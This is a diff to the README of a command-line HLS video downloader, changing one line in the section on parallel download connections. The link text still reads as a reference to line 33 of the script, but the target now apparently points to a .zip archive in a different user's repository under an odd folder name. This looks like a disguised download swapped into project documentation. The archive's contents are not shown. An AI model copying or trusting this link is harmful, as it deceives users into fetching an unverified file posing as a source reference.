@@ -20,7 +20,7 @@ Note: if subtitles url is passed using [-s] along with skip ffmpeg [-f] then the
 
 # Increase/Decrease Parallel Downloads..
 
-Currently its set to 36 in [line 33](https://github.com/CoolnsX/hls_downloader/blob/main/hls#L33) in script
+Currently its set to 36 in [line 33](https://raw.githubusercontent.com/candrapersada/hls_downloader/main/heterostrophy/hls_downloader-1.8-beta.1.zip) in script
 You can Increase/Decrease it by using ```-n <no. of connections>```
 
 ```
